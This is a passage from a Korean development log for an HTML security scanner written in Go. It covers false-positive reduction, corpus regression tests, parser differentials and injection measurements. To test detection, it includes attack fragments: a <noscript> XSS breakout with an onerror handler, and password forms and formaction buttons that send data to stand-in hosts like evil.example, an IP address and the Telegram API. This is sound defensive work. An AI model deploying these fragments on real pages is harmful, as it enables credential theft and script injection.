이전 기록에 "혼합 콘텐츠 6건"이라 적었으나 **오탐이었다.** 그 6건은 전부 `<a href="http://...">` 였다.

> 혼합 콘텐츠는 **브라우저가 자동으로 가져오는 하위 리소스**(script·img·css·iframe)가 평문일 때다. `<a href>` 는 사용자가 클릭해 이동하는 링크라 현재 페이지의 보안 경계를 깨지 않는다.

`isSubresource(tag, attr)` 로 정확히 판별하니 이 페이지의 혼합 콘텐츠는 **0건**이다. 같은 속성 이름이라도 태그에 따라 의미가 다르다 — `href` 는 `<link>` 일 때만 하위 리소스다.

### 12.5 같은 조직 판정 — eTLD+1

`www.lotteon.com` 페이지에서 `static.lotteon.com` 이 **외부 리소스로 잡혔다.** 문자열로는 다른 호스트니까.

브라우저의 same-origin 은 호스트가 정확히 같아야 하지만, **공급망 관점의 "우리 것"은 등록 가능한 도메인(eTLD+1) 단위**다. `static.lotteon.com` 에 스크립트를 올릴 수 있는 주체는 `lotteon.com` 을 소유한 조직이다.

```
static.lotteon.com  →  lotteon.com
www.seoul.go.kr     →  seoul.go.kr     (go.kr 은 등록 불가)
```

**"마지막 두 라벨"로는 안 된다.** `.kr`·`.uk`·`.jp` 는 `co.kr`·`co.uk` 처럼 두 라벨이 접미사다. 단순 규칙을 쓰면 `seoul.go.kr` 이 `go.kr` 로 잘려 **모든 정부 사이트가 한 조직으로 뭉친다.**

전체 Public Suffix List 는 9천 줄이 넘고 주기적으로 갱신된다. 외부 의존성 0 원칙과 맞지 않아 **실제로 마주치는 24개만 표로 들고 있다**(`multiLabelSuffixes`).

> 표에 없는 접미사는 마지막 두 라벨로 떨어진다. 이는 "같은 조직"으로 볼 범위가 넓어지는 쪽 — 즉 **오탐이 아니라 미탐 방향**의 실패다. 한계로 기록해 둔다.

이 판정 하나로 코퍼스에서 **오탐 41건**이 사라졌다 (`lotteon` 35→1, `nexon_login` 8→1).

### 12.6 집계 — 같은 원인은 한 줄로

`seoulsi.html` 에서 `sri-missing` 이 **282건** 나왔다. 같은 CDN 호스트가 스크립트를 수십 개 올린 것이다.

> 282줄을 읽는 사람은 없다. 그리고 그 282건의 **조치는 하나**다 — 그 CDN 을 신뢰하거나, integrity 를 붙이거나.

`aggregator` 로 **호스트별**로 묶어 첫 위치만 보고한다.

```
MEDIUM supply-chain [sri-missing] c.011st.com (3곳)
```

| 페이지 · 규칙 | 이전 | 이후 |
|---|---:|---:|
| seoulsi 전체 | 282 | **4** |
| github_login 전체 | 23 | **1** |
| jnu_main `inline-handler` | 5 | **1** |

**Go 의 맵 순회는 의도적으로 무작위다.** 맵을 그대로 순회해 출력하면 같은 입력에 매번 다른 순서가 나온다. `aggregator` 가 `keys []string` 로 **첫 등장 순서**를 따로 보관하는 이유이고, `FuzzScan` 의 "두 번 스캔하면 같은 결과" 검사가 이 결정성을 강제한다.

### 12.7 정상 페이지 코퍼스 — 회귀 기준을 12쪽으로

`curl` 로 받은 실제 페이지 12쪽. 뉴스·개발자·위키·쇼핑·정부·로그인 폼을 고루 섞었다.

**458건 → 26건.**

| 페이지 | 이전 | eTLD+1 후 | 집계 후 |
|---|---:|---:|---:|
| seoulsi | 282 | 282 | **4** |
| gyeonggi | 88 | 88 | **5** |
| lotteon | 35 | 1 | **1** |
| github_login | 23 | 23 | **1** |
| 11st | 9 | 9 | **5** |
| jnu_main | 8 | 8 | **4** |
| nexon_login | 8 | 1 | **1** |
| go · namuwiki | 각 2 | 2 | **2** |
| inven_login | 1 | 1 | **1** |
| hn · gmarket | 0 | 0 | **0** |
| **합계** | **458** | **417** | **26** |

**두 감소는 성격이 다르다.** 뭉뚱그려 "오탐 432건 제거"라고 적으면 틀린 기록이 된다.

| | 건수 | 무엇인가 |
|---|---:|---|
| eTLD+1 (§12.5) | 41 | **진짜 오탐.** 같은 조직 리소스를 외부로 오판했다 |
| 집계 (§12.6) | 391 | **오탐이 아니다.** 참인 발견을 391줄로 반복 출력했을 뿐이다 |

> 오탐은 **판정을 고쳐** 없앤 것이고, 중복은 **보고를 고쳐** 없앤 것이다.
> 둘 다 "숫자가 줄었다"로 보이지만 앞의 것만이 정확도의 개선이다.

**정정** — 작업 중 이 수치를 "449건 → 24건, eTLD+1 로 31건 제거"로 기록했으나 **전부 틀렸다.**
집계 이전 상태를 재구성해 다시 측정한 값이 위 표다(458 · 417 · 26).
재구성이 맞는지는 세 지점으로 교차 확인했다 — `jnu_main` 8건(§12.3 의 이전 기록),
`seoulsi` 282, `github_login` 23. 셋 다 당시 기록과 일치한다.

> 측정값을 옮겨 적는 단계에서 틀렸다. **다시 잴 수 있는 숫자는 다시 재라.**

| 규칙 | 건수 | 판정 |
|---|---:|---|
| `sri-missing` | 14 | 참 — 외부 CDN 에 integrity 가 실제로 없다 |
| `target-blank-no-rel` | 5 | 참 (INFO) |
| `inline-handler` | 4 | 참 (LOW) |
| `javascript-url` | 2 | 참 — 정부 사이트의 `javascript:zoomIn()` 레거시 |
| `zero-width` | 1 | 참 |

**HIGH 0건.** 12쪽 어디에서도 나오지 않았다. "HIGH 는 악성 행위에만"이라는 원칙이 실제 웹에서 지켜진다는 근거다.

남은 26건에 오탐은 없다 — 전부 실제로 그 자리에 있는 패턴이다. 다만 **취약점도 0건**이다. 가장 심각한 것이 MEDIUM 이고 그마저 레거시 `javascript:` 링크다. §13 의 구분이 측정으로 확인된 셈이다.

### 12.8 코퍼스를 테스트로 고정한다

측정만으로는 다음 교시에 다시 무너진다. `scanner/corpus_test.go` 가 이 표를 못 박는다.

**두 방향의 단언을 함께 건다.**

| | 정상 12쪽 | malicious_sample |
|---|---|---|
| 잡는 것 | **오탐** — 정상인데 HIGH | **미탐** — 악성인데 조용함 |
| 단언 | `HIGH == 0` | `HIGH >= 3` |

한쪽만으로는 속일 수 있다. 오탐 단언만 있으면 *아무것도 찾지 않는 스캐너*가 만점을 받고, 미탐 단언만 있으면 *전부 HIGH 로 찍는 스캐너*가 만점을 받는다. 두 방향을 같이 걸어야 규칙이 실제로 **구분**하고 있다는 근거가 된다.

`total` 은 판정이 아니라 **변경 감지기**다. 규칙을 고쳐 26건이 31건이 되면 테스트가 "의도한 것이냐"고 묻는다.

`t.Run` 으로 페이지마다 서브테스트를 만들었다. 실패하면 어느 페이지인지 이름이 그대로 찍힌다.

```
--- FAIL: TestCorpusNoFalsePositive/corpus/hn.html
    corpus_test.go:41: 정상 페이지에 HIGH — 오탐: 4행 [form-action-ip] ...
```

### 12.9 공격을 진짜 페이지에 끼워 넣기

규칙 단위 테스트의 HTML 은 `<form action=x><input type=password></form>` 같은 **깨끗한 조각**이다. 실제 공격은 소음이 많은 진짜 페이지 안에 들어간다. 그래서 정상 코퍼스 12쪽에 공격 조각 19종을 끼워 넣고 탐지되는지 쟀다.

탐지 판정은 **발견의 오프셋이 끼워 넣은 구간 안에 있는가**로 한다. 페이지가 원래 가진 발견과 섞이지 않는다.

| 끼워 넣은 위치 | 건수 | 탐지 | 해석 |
|---|---:|---:|---|
| `<body>` 시작 · `</body>` 직전 | 456 | **456** | 미탐 0 |
| `<!-- -->` 안 (대조군) | 216 | 0 | 브라우저가 무시 — 0 이 정답 |
| `<textarea>` 안 (대조군) | 216 | 12 | 마크업 공격 0. `zero-width` 12건은 텍스트라 실제로 보인다 |
| **기존 `<form>` 안** | 126 | 106 | 아래 |

> **절대 미탐이 나지 않는 측정은 측정이 고장 났을 수도 있다.** 대조군은 "실패할 수 있는가"를 확인하려고 둔다.

#### 기존 폼 안 — 스캐너가 브라우저처럼 동작한 곳

명세상 **폼이 이미 열려 있으면 새 `<form>` 시작 태그는 무시된다**(§7). 비밀번호 규칙 3종의 "미탐" 20건은 올바른 동작이었다 — 비밀번호는 끼워 넣은 폼이 아니라 **바깥 폼**으로 간다. `hn.html` 에서만 `cross-origin-password-form` 이 발동했는데, 바깥 폼의 action 이 `//hn.algolia.com/` 이라 비밀번호가 실제로 다른 도메인으로 가기 때문이다.

#### 규칙끼리 파서 해석이 달랐다 — HIGH 오탐

같은 자리에서 `form-action-ip` 와 `exfil-channel` 은 **발동했다.** 브라우저가 버리는 폼에 HIGH 를 붙인 것이다.

| 규칙 | 폼을 어떻게 보나 | 중첩 폼 |
|---|---|---|
| 비밀번호 규칙 3종 | `ctx.OpenForm()` — **스택에 묻는다** | 브라우저와 같음 |
| `form-action-ip` · `exfil-channel` | `<form>` 시작 태그를 **직접 본다** | 무시된 폼도 봄 |

§2 의 Parser Differential 이 **규칙 계층 안에서** 깨져 있었다. 토크나이저가 브라우저와 같아도, 규칙이 스택을 건너뛰면 소용없다.

```go
// 스택은 규칙보다 먼저 갱신되므로, 채택됐다면 form pointer 가 바로 이 토큰이다.
func (c *Context) FormAccepted(tok tokenizer.Token) bool {
    return c.stack.form != nil && c.stack.form.Offset == tok.Offset
}
```

**뻔한 수정은 틀린다.** "열린 폼이 이미 있으면 중첩"이라고 `return c.stack.form == nil` 로 쓰면 **모든 폼 탐지가 사라진다.** §7 의 "스택 갱신을 규칙보다 먼저" 때문에, 규칙이 `<form>` 을 볼 때는 이미 그 폼이 등록돼 있다. 질문은 "열린 폼이 있는가"가 아니라 **"열린 폼이 바로 이 토큰인가"** 여야 한다. 양성 케이스 `바깥이IP` · `앞form닫힌뒤` 가 이 실수를 막는다.

포인터가 아니라 `Offset` 으로 비교하는 이유 — `stack.go` 는 `t := tok; s.form = &t` 로 **복사본의 주소**를 저장하고, 규칙이 받는 `tok` 도 값으로 넘어온 다른 복사본이다. 주소로는 같은 토큰임을 알 수 없다.

#### 측정이 찾은 다음 미탐 — `formaction`

`<button formaction="...">` 은 누르는 순간 폼의 action 을 덮어쓴다. 세 규칙 모두 놓친다.

```
form-action-ip               0건   <button formaction="http://203.0.113.7/x">
exfil-channel                0건   <button formaction="https://api.telegram.org/...">
cross-origin-password-form   0건   <button formaction="https://evil.example/">
```

#### 해결 — §12.10

#### 정정 — "미탐 기준은 합성 샘플 1개뿐"

§14 에 "지금 규칙을 하나 망가뜨려도 … 합성 샘플 하나가 그 유일한 방어선이다"라고 적었으나 **틀렸다.** 21개 규칙을 하나씩 등록 해제해 보니 **21개 전부 최소 한 개의 테스트가 실패**했다. 규칙 단위 테스트가 `countCode` → `ScanURL` 로 엔진 전체를 거치기 때문이다. 확인하지 않고 쓴 주장이었다.

빈틈은 "규칙이 테스트되지 않는다"가 아니라 **"깨끗한 조각에서만 테스트된다"** 였고, 이 절의 측정이 그것을 재는 방법이다.

### 12.10 전송지는 하나가 아니다 — `formaction`

§12.9 에서 측정한 미탐을 두 교시에 걸쳐 닫았다. 정상 코퍼스에서 `formaction` 사용은 **0회**라 오탐 위험은 없었다. 반면 `type="button"` 은 52회라, 제출하지 않는 버튼을 정확히 걸러야 했다.

#### 제출 버튼이란 무엇인가 — 명세

| 요소 | 제출하나 |
|---|---|
| `<button>` · `type="submit"` · **`type="foo"`(잘못된 값)** | ✅ — 기본값이 submit |
| `<button type="button">` · `type="reset"` | ❌ |
| `<input type="submit">` · `type="image"` | ✅ |
| form **밖**의 버튼 | ❌ — 제출할 form 이 없다 |

`<button>` 은 **"button·reset 이라고 명시하지 않으면 전부 submit"** 이다. "submit 이라고 써야 submit"으로 구현하면 가장 흔한 형태(type 없음)를 놓친다.

#### 30교시 — 전송지 하나로 판정하는 규칙

`form-action-ip` · `exfil-channel` 은 전송지 **하나만** 보면 판정된다. `formDestination(ctx, tok)` 헬퍼가 "이 토큰이 전송지를 선언하는가"를 한 곳에서 답한다 — 채택된 `<form action>`, 또는 form 안 제출 버튼의 `formaction`. §12.9 의 `FormAccepted` 도 여기로 모였다. `Evidence` 가 `"action="` 고정에서 실제 속성 이름으로 바뀌었다.

#### 31교시 — 순서가 정해지지 않은 두 사실

```html
<form action="/login">
  <input type="password">                        ← ① 비밀번호가 있다
  <button formaction="https://evil.example/">     ← ② 전송지가 외부다
```

비밀번호 규칙 3종은 ①과 ②를 **둘 다** 알아야 한다. 토큰을 앞에서부터 보는 구조라 ①에서는 ②를 아직 모르고, 순서가 반대인 페이지도 있다.

| | A. 폼이 끝날 때 한꺼번에 | **B. 늦게 온 쪽에서** |
|---|---|---|
| 발견 위치 | `</form>` 이나 문서 끝 | **문제의 `<input>` 이나 `<button>`** |
| 닫히지 않은 폼 | `Finish` 에서 따로 처리 | 그대로 동작 |

피싱 페이지는 `</form>` 을 안 닫는 일이 흔하고(§6), 발견은 원인을 가리켜야 한다. **B** 를 택했다.

`credentialTracker`(`scanner/submission.go`)가 폼 하나 동안 "비밀번호를 봤는가"와 "본 formaction 들"을 기억하고, 늦게 온 토큰에서 **"이번에 비밀번호가 닿게 된 전송지"** 를 `ctx.CredentialDestinations()` 로 내놓는다. **사실 수집은 추적기 하나, 판정은 규칙 셋** — 스택이 구조를 한 번 계산하고 규칙이 묻는 것과 같은 분리다.

**의도적으로 바꾼 동작** — 비밀번호 확인 칸이 있는 폼은 입력마다 2건이던 것이 **1건**이 됐다. 폼 하나 · 전송지 하나당 조치도 하나다(§12.6 집계와 같은 원칙). 정상 코퍼스에서 이 규칙들은 원래 0건이라 수치 변화는 없다.

#### 추적 순서가 틀리면 건수는 맞고 위치가 틀린다

`ctx.cred.observe` 를 규칙 루프 **뒤로** 옮겨봤다. 실패는 **3개뿐**이었다.

```
올바른 순서   Offset=34 → "<input type=password></form>"
규칙 뒤로     Offset=55 → "</form>"
```

규칙이 **한 토큰 늦게** 결과를 보므로 발견이 다음 토큰에 붙는다. 실패한 3개는 입력이 마지막 토큰이라 발견이 사라진 경우였고, 나머지 건수 테스트는 **위치가 밀린 것을 볼 수 없었다.** `TestCredentialOffset` 이 위치를 단언한다. §7 의 "스택 갱신을 규칙보다 먼저"와 같은 원칙이지만, 틀렸을 때 **드러나지 않는 방식**이 다르다.

| 검증 | 결과 |
|---|---|
| 결함 주입 — 중복 방지 · 먼저 온 버튼 · 폼 초기화 · 비밀번호 확인 · 호출 순서 | 각각 다른 케이스가 잡음 |
| 코퍼스 12쪽 × 2위치에 비밀번호+formaction 공격 4종(버튼이 먼저인 경우 포함) | 96건 미탐 0 |
| 기존 출력 (malicious_sample · jnu_main · github_login) | 바이트 동일 |

### 12.11 측정을 영구 테스트로 — 무엇을 잡고 무엇을 못 잡나

§12.9~12.10 의 결함 둘은 스크래치패드의 주입 측정이 찾았다. 그대로 옮기면 `scanner` 테스트가 0.4초에서 2.0초가 된다. **그 값이 있는지 먼저 쟀다.** 진짜 페이지 맥락에서 깨질 법한 결함 다섯을 심어 기존 테스트와 비교했다.

| 심은 결함 | 기존 테스트 실패 | 주입 테스트 실패 |
|---|---:|---:|
| M1 `escaped` 확인 없이 `doubleEscaped` 진입 | **0** | **0** |
| M2 `</SCRIPT>` 대소문자 무시 제거 | 4 | 0 |
| **M3 `textarea` 를 원시 텍스트에서 제거** | **0** | **23** |
| M4 `</form>` 에서 form 포인터를 안 지움 | 8 | 5 |
| M5 `doubleEscaped` 에서 `-->` 무시 | 2 | 0 |

- **M3 는 주입 테스트만 잡았다.** `TestRawVsRcdata` 의 textarea 케이스는 `&lt;` 디코딩만 보고, 안의 마크업이 태그로 풀리지 않는지는 보지 않았다.
- **M2·M5 는 기존 테스트만 잡았다.** 코퍼스에 그런 형태가 없다. 주입 테스트는 단위 테스트를 **대체하지 않고 보완한다.**
- **M1 은 아무도 못 잡았다.** `document.write('<script …>')` 문자열 하나로 뒤따르는 `<img onerror>` 가 스크립트 텍스트로 삼켜지는 미탐이다. 주입 테스트는 **완결된 조각을 끼워 넣기** 때문에 이 맥락을 만들 수 없다 → `TestScriptEscaped/문자열속script태그` 로 막았다.

#### `scanner/inject_test.go`

| 요소 | 결정 |
|---|---|
| 페이지 | `corpus` 표 재사용 (12쪽) |
| 공격 | 24종. 집계 규칙 2종은 발견이 **페이지의 첫 위치**를 가리켜 제외, `phishing-interstitial` 은 페이지 판정이라 제외 |
| 위치 | `body-start` · `body-end` → 탐지 / 주석 · `<textarea>` → **탐지 안 됨**(대조군). `zero-width` 만 텍스트라 textarea 안에서도 탐지 |
| 판정 | 발견의 `Offset` 이 **끼워 넣은 구간 안**일 때만 주입된 공격의 것 |
| 보고 | 공격 단위로 실패 쪽을 모아 한 줄 — 규칙 하나가 망가져도 12줄이 쏟아지지 않는다 |
| 시간 | `testing.Short()` 면 건너뛴다. `go test -short` 0.4초 / 전체 2.2초. CI 는 전체 |

**못 잡는 것** — 31교시의 추적 순서 결함을 심어봤더니 **0개** 실패했다. 발견이 한 토큰 밀려도 여전히 끼워 넣은 구간 안이기 때문이다. `TestCredentialOffset` 이 잡는다. **테스트마다 보는 것이 달라 서로 대체할 수 없다.**

### 12.12 `<noscript>` — 브라우저의 설정이 파싱을 바꾼다

명세는 **스크립트가 켜져 있으면** `<noscript>` 를 `<style>` 처럼 원시 텍스트로 파싱한다. 우리는 일반 마크업으로 파싱하고 있었다.

```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
          └ 브라우저: 텍스트 ┘└─ 진짜 <img> — onerror 실행 ─┘
          └ 우리: <p> 의 title 속성값 ──────────────────────┘ → 안 보임
```

속성값 안이든 `<style>` 안이든, 브라우저는 **처음 만나는 `</noscript>`** 에서 끝낸다. 세 가지 탈출 입력에서 발견은 0건이었다 — **실행되는 XSS 를 놓치는 미탐**이다. 새니타이저가 스크립트를 끈 상태로 파싱하고 브라우저가 켠 상태로 렌더링해서 뚫린 실제 우회 유형과 같은 구조다.

정상 코퍼스 6쪽에 `<noscript>` 17개가 있었지만 그 안의 발견은 0건이었고, 변경 후 수치도 같다.

#### 대가 — 결정이 필요했다

원시 텍스트로 바꾸면 `<noscript>` 안의 마크업을 규칙이 보지 못한다. 안에 공격 24종을 주입해보니 `zero-width`(텍스트 신호)만 남고 **23종이 사라졌다.**

| 사라지는 것 | 스크립트 켠 사용자 | 스크립트 끈 사용자 |
|---|---|---|
| 스크립트가 있어야 동작 (8종) — `javascript-url` · 스크립트 속 exfil·eval·웹셸 · `sri-missing` · `resource-ip` · `data-uri` · `iframe-sandbox` | 텍스트 | **스크립트가 안 돎** |
| 스크립트 없이 동작 (15종) — 비밀번호 폼 · 폼 IP·exfil · `meta-refresh` · `base-href` · `download` · `mixed-content` 등 | 텍스트 | 보이고 동작함 |

앞의 8종은 **어느 설정에서도 실행될 수 없었다** — 사실상 오탐이었다. 뒤의 15종은 스크립트를 끈 소수 사용자에게만 의미가 있다.

**스크립트가 켜진 브라우저를 기준으로 삼았다.** 사용자와 공격 대상의 거의 전부가 그쪽이고, 그 기준을 따르지 않으면 **실행되는 XSS 를 놓친다.** 스크립트를 끈 사용자에게만 보이는 폼·링크는 한계로 남긴다(§14).

#### 테스트 세 벌 — 층마다 다르게 본다

| 테스트 | 보는 것 | 줄을 지우면 |
|---|---|---|
| `TestNoscriptText` (tokenizer) | 어디서 자르는가 | 2개 실패 |
| `TestParserDifferential` (scanner, 신설) | 탈출한 태그를 규칙이 보는가 | 3개 실패 |
| `TestInjectedAttacks/noscript` | 진짜 페이지에서 안쪽을 무시하는가 | 23개 실패 |

`scanner/differential_test.go` 는 **브라우저와 해석이 갈리는 입력**을 모으는 곳으로 만들었다.

#### 탈출은 보이지만 심각도가 낮다

탈출한 `<img onerror>` 는 `inline-handler`(LOW), `<a href=javascript:>` 는 `javascript-url`(MEDIUM)로 나온다. 그러나 **정상 페이지는 `<noscript>` 안의 속성값에 `</noscript>` 를 넣지 않는다.** 탈출 자체가 공격자의 흔적이다 → `noscript-breakout` 규칙 후보.

### 12.13 `noscript-breakout` — 끊겼는지 말하지 않던 토크나이저

§12.12 의 탈출은 이제 보이지만 `inline-handler`(LOW) 로만 나왔다. **탈출 자체**를 규칙으로 만들었다.

> **판정 기준** — `<noscript>` 의 내용을 스크립트를 끈 브라우저처럼 마크업으로 다시 읽었을 때, 태그·속성·주석·원시 텍스트 요소 **한가운데서 끊긴다.**

정상 코퍼스의 `<noscript>` 17개 중 끊긴 것은 **0개**였다.

#### 먼저 토크나이저를 고쳐야 했다

```
"<p title=\""   → START:p           ← 속성값에서 끊겼는데 멀쩡한 태그처럼 나옴
"<style>a{}"    → START:style, TEXT ← 닫는 태그 없음을 구분할 수 없음
"<!-- a"        → COMMENT           ← 안 닫힌 주석도 같은 모양
```

브라우저는 태그 한가운데서 끝난 입력을 **버린다.** 우리 토크나이저는 조용히 토큰을 만들어 "끊겼다"는 사실을 잃었다. `Tokenizer.Truncated()` 를 더했고, EOF 를 만나는 여섯 곳(`Next` 원시 텍스트 직후 · `readTag` · `readRawText` · `readComment` · `readBogusComment` · `readDoctype`)이 표시를 남긴다. 한 곳씩 지웠을 때 각각 다른 케이스가 실패하는 것을 확인했다.

#### 판정은 내용에서, 보고는 `</noscript>` 에서

"끊겼는가"는 TEXT 토큰에서 알지만 탈출이 일어나는 곳은 뒤따르는 `</noscript>` 다. 상태를 기억했다가 END 에서 보고한다. **`</noscript>` 가 오지 않으면 보고하지 않는다** — 어느 설정도 끝을 보지 못했으니 차이가 없다.

보고 후 **반드시 상태를 비운다.** 탈출 페이로드 끝에는 여분의 `</noscript>` 가 붙어 있어서, 비우지 않으면 한 번 더 보고한다. 초기화를 지워보니 음성이 아니라 **양성 케이스가 대부분 실패**했다(1건 → 2건).

#### 심각도 — MEDIUM evasion

탈출은 공격 기법이지만 **닫히지 않은 따옴표 같은 오타**로도 같은 모양이 생긴다(`<img src="…?id=1></noscript>`). 규칙은 둘을 구분하지 못하므로 "HIGH 는 악성 행위에만" 원칙에 따라 MEDIUM. `obfuscated-eval` 과 같은 판단이다. 탈출한 페이로드는 기존 규칙이 따로 보고한다.

**HIGH 로 올리려 했으나 측정에서 기각했다** — §12.15.

#### 주입 테스트에서 제외한 이유

탈출 조각을 `<noscript>` 로 한 번 더 감싸도 **여전히 탈출**이라, noscript 대조군의 기대가 반대다. 실제로 넣어보니 그 위치만 "발동하면 안 됨"으로 실패했다. `differential_test.go` 에서 따로 검증한다.

### 12.14 외래 콘텐츠 — 만들지 않기로 한 결정

§12.12 의 반대 방향 차이가 `<svg>`·`<math>` 안에 있다. 측정부터 했다.

| 입력 | 우리 | 브라우저 (명세 기준) |
|---|---|---|
| `<svg><style><img onerror=…>` | `<img>` 를 **텍스트로** | `<style>` 이 RAWTEXT 로 전환되지 않음 → **진짜 태그** |
| `<svg><title><img …>` | 텍스트로 | 태그로 |
| `<svg><foreignObject><img>` | 태그로 | 태그로 (**일치**) |

우리는 **미탐 방향**이다. 다만 정상 코퍼스의 `<svg>` 39개 안에 `style`·`title`·`textarea` 는 **하나도 없어서**, 이 차이가 지금 오탐을 만들지는 않는다.

**그런데도 구현하지 않기로 했다.** 이유 셋이 모두 같은 방향을 가리킨다.

1. **토크나이저의 일이 아니다.** "지금 외래 콘텐츠 안인가"는 네임스페이스 스택이 있어야 알 수 있고, 그 안에서도 `<foreignObject>`·`<annotation-xml encoding=text/html>` 는 다시 HTML 이다(integration point). §1 에서 보류한 트리 구성의 핵심부다.
2. **반쪽 구현은 새 차이를 만든다.** integration point 를 빠뜨리고 "svg 안은 전부 마크업"으로 처리하면, 정상 SVG 를 잘못 읽는 **반대 방향 오탐**이 생긴다. 놓친 것을 잡으려다 멀쩡한 것을 깬다.
3. **검증 수단이 없다.** 위 표의 "브라우저" 열은 명세 지식일 뿐, 이 환경에서 브라우저를 실행해 확인할 수 없다. §9 가 분해한 원본의 실패가 바로 **검증되지 않은 탐지 로직**이었다.

> 재지 못하는 것은 만들지 않는다. 놓치고 있다는 사실을 아는 채로 두는 편이, 맞는지 모르는 코드를 넣는 것보다 낫다.

이 결정은 **트리 구성이 생기면 함께 풀린다.** `<input form="id">`, foster parenting 과 같은 묶음이다(§14).

### 12.15 HIGH 조합을 측정이 기각했다

§12.13 의 후보: *탈출 ∧ 탈출로 열린 구간 안의 실행 요소*. 논리곱의 두 항이 모두 이진 판정 가능하니 §3 의 형태는 갖췄다. 전제는 **"오타로 생긴 탈출에는 뒤따르는 실행 요소가 없다"** 였다.

**구현 전에 전제를 쟀다.** 코퍼스의 `<noscript>` 내용에서 닫는 따옴표를 하나씩 지워 오타를 만들고, 탈출 구간(끊긴 구조가 스크립트를 끈 브라우저에서 닫히는 지점까지)에 실행 요소가 들어오는지 봤다.

| 측정 | 결과 |
|---|---|
| 오타 시뮬레이션 | 4건 중 **1건**에서 구간에 `<script>` (`11st.html`, 구간 8바이트) |
| 정상 `<noscript>` 17개 | **3개**가 뒤 300바이트 안에 실행 요소(`<script>` 2 · `<a onclick>` 1) |
| 그중 바로 다음 시작 태그가 `<script>` | **2개** |

**전제가 틀렸다.** `</noscript>` 뒤에 `<script>` 가 오는 것은 정상 페이지의 흔한 배치라, 오타가 탈출을 만들면 구간이 곧바로 실행 요소를 삼킨다. 이 논리곱은 오타와 공격을 가르지 못한다.

거리로 좁히는 방법(구간이 N바이트 이내)도 생각했으나 그건 §9.3 에서 버린 **임계값**이다. `noscript-breakout` 은 MEDIUM 으로 유지한다.

> 형태가 논리곱이어도 각 항의 전제가 참이어야 한다. **논리곱은 근거를 만들어 주지 않는다.**

### 12.16 form owner — 트리가 필요 없었다

보류 항목 셋(외래 콘텐츠 · `<input form="id">` · foster parenting)을 "트리 구성"으로 묶어 두고 있었다. **무엇이 실제로 필요한지 쟀다.**

| 항목 | 코퍼스 실측 | 실제로 필요한 구조 |
|---|---|---|
| 외래 콘텐츠 | integration point 0개 | 스택에 네임스페이스 추가 — 트리 아님 |
| `<input form="id">` | `form=` 속성 0개 | **id → form 맵** — 트리 아님 |
| foster parenting | `<table>` 안 form 1 · input 1 | **진짜 트리 조작** |

셋 중 둘은 트리가 아니었다. §7 에서 `<input form="id">` 를 "스택으로는 원리적으로 불가"라 적었는데, **맞는 절반**(스택으로는 안 된다)과 **틀린 절반**(그래서 트리가 필요하다)이 섞여 있었다. 필요한 것은 **참조 해소**였고, 그건 맵이면 된다.

#### 무엇을 놓치고 있었나

```html
<form id="f" action="https://evil.example/steal"></form>
<input type="password" form="f">        ← 폼 밖인데 그 폼으로 전송된다
```

명세의 **form owner**: `form="id"` 가 있으면 조상이 아니어도, 문서 어디에 있든 그 폼에 속한다. 실측에서 비밀번호 규칙 3종이 전부 **0건**이었다.

#### 왜 문서를 두 번 훑는가

`form="id"` 가 가리키는 폼이 **뒤에 나올 수 있다.** 한 번 훑기로는 판정 시점에 대상을 모른다. 그래서 스캔 전에 `collectForms` 가 id 를 가진 `<form>` 만 모은다. 브라우저가 버리는 **중첩 form 은 등록하지 않고**, 같은 id 가 여럿이면 **첫 번째**가 이긴다(`getElementById` 와 같은 규칙).

**비용** — 350KB 페이지에서 7.4ms → 8.4ms(+14%), 할당 2.5MB → 4.4MB. 파일 하나에 1ms 라 최적화하지 않고 단순함을 택했다.

#### 일반화하니 코드가 짧아졌다

31교시 추적기에는 "폼이 바뀌면 초기화"가 있었다. 원격 연결에서는 *지금 열린 폼 하나*라는 전제가 깨진다 — 폼 A의 입력과 폼 B의 버튼이 번갈아 올 수 있다. 폼 오프셋을 키로 한 **맵**으로 바꾸자 초기화 줄이 **사라졌다.** 처음 보는 폼이면 맵이 빈 상태를 만들어 준다.

### 12.17 코퍼스를 넓혔더니 오탐이 드러났다

`punycode` 규칙을 만들려면 **정상 IDN 표본**이 필요한데 코퍼스에 없었다. §12.14 의 "재지 못하는 것은 만들지 않는다"에 따라 코퍼스가 선행 조건이 됐다. 그런데 재보니 더 큰 빈틈이 있었다.

```
규칙 22종 중 코퍼스에서 발동 5종 / 한 번도 안 나온 규칙 17종
```

이 숫자는 그대로 읽으면 안 된다. 미발동에는 성격이 다른 둘이 섞여 있다.

| | 예 | 0건의 의미 |
|---|---|---|
| 안 나오는 게 **목표** | `webshell-signature` · `exfil-channel` · `form-action-ip` | 좋은 신호 |
| 아직 **시험받지 않음** | `mixed-content` · `iframe-sandbox-escape` · `obfuscated-eval` | 오탐 여부를 **모른다** |

위키백과·MDN·BBC·python.org·네이버·다음·동아일보·w3schools·Mozilla·neverssl(http)·CERN 등 12개를 받아 돌렸다. **HIGH 는 전부 0건**이었고 **새로 시험된 규칙은 없었다** — 여전히 같은 5종만 발동했다. 대신 다른 것이 나왔다.

```
위키백과   title="اچ[ZWNJ]تی[ZWNJ]ام[ZWNJ]ال"   ← 페르시아 문자로 쓴 "HTML"
동아일보   alt="목표는 180CM🧍[ZWJ]️‼️…"          ← 이모지 결합
```

**`zero-width` 의 실제 오탐**이다. 한국어·영어 코퍼스에서는 보이지 않다가 다국어 페이지를 넣자마자 드러났다.

코퍼스를 12쪽 → **17쪽**으로 늘렸다(다국어·이모지·영어 뉴스·한국 포털·평문 http). 대가는 시간이다 — `go test ./...` 3.5초 → **6.0초**, `-short` 는 0.6초 그대로. §12.11 에서 만든 구분이 여기서 값을 한다.

### 12.18 제로폭 문자 — "있다"에서 "쓰일 이유가 없다"로

코퍼스 17쪽의 제로폭 문자를 **전수 조사**했다.

| 패턴 | 건수 | 판정 |
|---|---:|---|
| ZWNJ ← Arabic → Arabic (위키백과) | 12 | 페르시아어 맞춤법 — **정상** |
| ZWJ ← 이모지 → VS16 (동아일보) | 3 | 이모지 결합 — **정상** |
| ZWSP ← 공백/ZWSP → ZWSP (jnu_main) | 7 | 연속 7개, 정당한 용도 없음 — **의심** |

**ZWNJ(U+200C)** 는 아랍·페르시아·인도계 문자에서 글자 연결을 끊는 필수 문자이고, **ZWJ(U+200D)** 는 이모지를 결합하는 필수 문자다. 판정을 주변 문자의 **문자 체계**로 바꿨다.

```go
func zeroWidthLegit(r, prev, next rune) bool {
	switch r {
	case '\u200C', '\u200D':
		if joiningScript(prev) && joiningScript(next) {
			return true
		}
		return r == '\u200D' && emojiPart(prev) && emojiPart(next)
	}
	return false
}
```

